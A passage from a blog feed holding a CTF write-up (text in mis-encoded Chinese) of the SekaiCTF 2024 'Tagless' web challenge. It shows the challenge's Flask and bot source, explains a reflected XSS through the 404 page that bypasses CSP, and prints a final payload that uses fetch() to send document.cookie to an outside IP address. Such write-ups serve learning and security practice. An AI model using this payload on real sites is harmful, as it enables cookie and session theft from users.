    
    <category term="ååºåˆ—åŒ–" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Project Sekai CTF2024å¤ç°</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-08-31T04:52:35.000Z</published>
    <updated>2024-08-31T14:38:07.462Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>xssé¢†åŸŸå¤§ç¥å•Š</p><p>ä½ è¯´å¾—å¯¹ï¼Œä½†ä»Šå¤©æ˜¯å“ˆèŒ¨æ¶…ç±³åº“å¥³å£«çš„ç”Ÿæ—¥ï¼Œè½¬å‘è¿™æ¡æ¶ˆæ¯åˆ°äº”ä¸ªç¾¤ï¼Œä¸­é—´å¿˜äº†ï¼Œåæ­£ä¼šè¢«éª‚ä¸€é¡¿ï¼Œä½†ä»Šå¤©çœŸçš„æ˜¯å“ˆèŒ¨æ¶…ç±³åº“å¥³å£«çš„ç”Ÿæ—¥</p><p>äº‹å·²è‡³æ­¤ï¼Œå…ˆæ‰“ä¼špjskå§ï¼ˆ</p><p><img src="/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/image-20240831223757429.png" alt="image-20240831223757429"></p><p>å‚è€ƒï¼š</p><p><a href="https://hackmd.io/@Whale120/HJ_rpvujC?utm_source=preview-mode&utm_medium=rec#WEB">https://hackmd.io/@Whale120/HJ_rpvujC?utm_source=preview-mode&amp;utm_medium=rec#WEB</a></p><p><a href="https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/">https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/</a></p><p><a href="https://blog.ankursundara.com/htmlsandbox-writeup/amp/">https://blog.ankursundara.com/htmlsandbox-writeup/amp/</a></p><span id="more"></span><hr><h1 id="Targless"><a href="#Targless" class="headerlink" title="Targless"></a>Targless</h1><p>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span>request<span class="token keyword">from</span> bot <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparseapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> static_folder<span class="token operator">=</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>after_request</span><span class="token keyword">def</span> <span class="token function">add_security_headers</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token punctuation">:</span>    resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"script-src 'self'; style-src 'self' https://fonts.googleapis.com https://unpkg.com 'unsafe-inline'; font-src https://fonts.gstatic.com;"</span>    <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/report"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">report</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    bot <span class="token operator">=</span> Bot<span class="token punctuation">(</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> url<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            parsed_url <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Invalid URL."</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">if</span> parsed_url<span class="token punctuation">.</span>scheme <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"http"</span><span class="token punctuation">,</span> <span class="token string">"https"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Invalid scheme."</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">if</span> parsed_url<span class="token punctuation">.</span>hostname <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string">"localhost"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Invalid host."</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">401</span>                bot<span class="token punctuation">.</span>visit<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        bot<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"visited"</span><span class="token punctuation">:</span>url<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">200</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span><span class="token string">"URL parameter is missing!"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">400</span>    <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> request<span class="token punctuation">.</span>path    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string"> not found"</span></span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;report è·¯ç”±é™åˆ¶äº†å¿…é¡»æ˜¯<code>http://127.0.0.1</code>è¿™æ ·çš„æœ¬åœ°ip</p><p>è®¾ç½®äº†cspï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">script<span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span> style<span class="token operator">-</span>src <span class="token string">'self'</span> <span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>fonts<span class="token punctuation">.</span>googleapis<span class="token punctuation">.</span>com https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>unpkg<span class="token punctuation">.</span>com <span class="token string">'unsafe-inline'</span><span class="token punctuation">;</span> font<span class="token operator">-</span>src https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>fonts<span class="token punctuation">.</span>gstatic<span class="token punctuation">.</span>com<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨æ„åˆ°<code>@app.errorhandler(404)</code>è¿™é‡Œä¸“é—¨é‡å†™äº†404å“åº”ï¼Œä¼šå®Œæ•´å›æ˜¾ path</p><p>bot.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>chrome<span class="token punctuation">.</span>options <span class="token keyword">import</span> Options<span class="token keyword">import</span> time <span class="token keyword">class</span> <span class="token class-name">Bot</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        chrome_options <span class="token operator">=</span> Options<span class="token punctuation">(</span><span class="token punctuation">)</span>        chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--headless"</span><span class="token punctuation">)</span>          chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-gpu"</span><span class="token punctuation">)</span>        chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--no-sandbox"</span><span class="token punctuation">)</span>         chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-dev-shm-usage"</span><span class="token punctuation">)</span>        chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-extensions"</span><span class="token punctuation">)</span>         chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--window-size=1920x1080"</span><span class="token punctuation">)</span>                 self<span class="token punctuation">.</span>driver <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>options<span class="token operator">=</span>chrome_options<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">visit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:5000/"</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>add_cookie<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"flag"</span><span class="token punctuation">,</span>             <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token string">"SEKAI&#123;dummy&#125;"</span><span class="token punctuation">,</span>             <span class="token string">"httponly"</span><span class="token punctuation">:</span> <span class="token boolean">False</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                 self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>refresh<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Visited </span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">close</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆæ­£å¸¸çš„chromeæµè§ˆå™¨è®¿é—®ï¼Œè®¾ç½®äº†cookieä¸ºflag</p><p>é‚£ä¹ˆæˆ‘ä»¬çš„æ ¸å¿ƒå°±åœ¨è¿™ä¸ª404å¸¦å‡ºå®Œæ•´ path ä¸Šäº†ï¼Œæ˜æ˜¾èƒ½æ‰“åå°„å‹xssï¼Œé—æ†¾çš„æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥æ‰“<code>&lt;script&gt;window.alert(1)&lt;/script&gt;</code>ï¼Œä¼šè¢« CSP æ‹¦ä¸‹æ¥</p><p>æŠŠ CSP ä¸¢ <a href="https://csp-evaluator.withgoogle.com/">Google CSP Evaluator</a> éªŒä¸€ä¸‹</p><p><img src="/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/image-20240831115000100.png" alt="image-20240831115000100"></p><p>å› ä¸ºè¿™é‡Œæ˜¯<code>script-src &#39;self&#39;</code>ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•è¿™æ ·ç»•è¿‡</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/alert(1)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/image-20240831115722819.png" alt="image-20240831115722819"></p><p>æ§åˆ¶å°æŠ¥é”™<code>Uncaught SyntaxError: unterminated regular expression literal</code>ï¼Œæ­¤æ—¶å°±å¯ä»¥ç®—æ˜¯æˆåŠŸæ’å…¥äº†ï¼Œè™½ç„¶è¢«è¿™ä¸ªé¡µé¢å›æ˜¾çš„<code>/</code>å’Œ<code>not found</code>å½±å“åˆ°äº† script è§£æï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨<code>/*</code>ã€<code>*/</code>ã€<code>//</code>æ³¨é‡Šæ‰</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/**/alert(1)//<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/image-20240831120442492.png" alt="image-20240831120442492"></p><p>äºæ˜¯ç»•è¿‡äº†CSP</p><p>æ—¢ç„¶ç»•è¿‡äº†CSPï¼Œæ¥ä¸‹æ¥å°±ç›´æ¥è®©botç‚¹å°±å®Œäº‹äº†ï¼Œç”¨<code>fetch</code>è¯·æ±‚å¸¦å¤–</p><p>æœ€ç»ˆpayloadï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">url=http://127.0.0.1:5000/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/**/fetch('http://192.168.175.196:666/'+document.cookie);//<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/image-20240831110909718.png" alt="image-20240831110909718"></p><p>æˆ‘å†çœ‹çœ‹å…¶å®ƒçš„æ–‡ä»¶ï¼š</p><p>index.html</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Tagless<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://fonts.googleapis.com/css?family=Press+Start+2P<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://unpkg.com/nes.css@2.3.0/css/nes.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">                <span class="token selector">body, html</span> <span class="token punctuation">&#123;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>            <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>            <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>            <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #212529<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>            <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Press Start 2P'</span><span class="token punctuation">,</span> cursive<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.container</span> <span class="token punctuation">&#123;</span>            <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.nes-field, .nes-btn</span> <span class="token punctuation">&#123;</span>            <span class="token property">margin-top</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">iframe</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 300px<span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>            <span class="token property">margin-top</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #212529<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #FFF<span class="token punctuation">;</span>             <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Press Start 2P'</span><span class="token punctuation">,</span> cursive<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.nes-container.is-dark.with-title</span> <span class="token punctuation">&#123;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #212529<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nes-container with-title is-centered is-dark<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Tagless Display<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nes-field is-inline<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userInput<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nes-text is-primary<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Your Message:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userInput<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nes-input<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Hello, Retro World!<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>displayButton<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nes-btn is-primary<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Display<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>output<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>displayFrame<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/app.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½œä¸ºæœ¬åœ°æ–‡ä»¶ï¼Œå¯ä»¥ç”¨<code>iframe</code>åµŒå…¥ï¼Œè€Œ<code>iframe</code>æœ‰ä¸ªç‰¹æ€§ï¼šæ‰€æœ‰è¢«æ‰§è¡Œçš„ JavaScript å¿…é¡»æ˜¯è¢«åµŒå…¥çš„ç½‘ç«™æœ¬èº«æœ‰çš„ï¼Œæˆ–è€…ç”¨<code>srcdoc</code>ï¼ˆè¿™ä¸ªä¸å— csp çš„<code>frame-src</code>å½±å“ï¼‰</p><p>ç°åœ¨æ¥çœ‹ä¸€ä¸‹è¿™é‡Œå”¯ä¸€çš„ä¸€ä¸ª JavaScript è„šæœ¬app.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"DOMContentLoaded"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> displayButton <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"displayButton"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        displayButton<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">displayInput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">sanitizeInput</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;.*></span><span class="token regex-delimiter">/</span><span class="token regex-flags">igm</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;\.*></span><span class="token regex-delimiter">/</span><span class="token regex-flags">igm</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;.*>.*&lt;\/.*></span><span class="token regex-delimiter">/</span><span class="token regex-flags">igm</span></span><span class="token 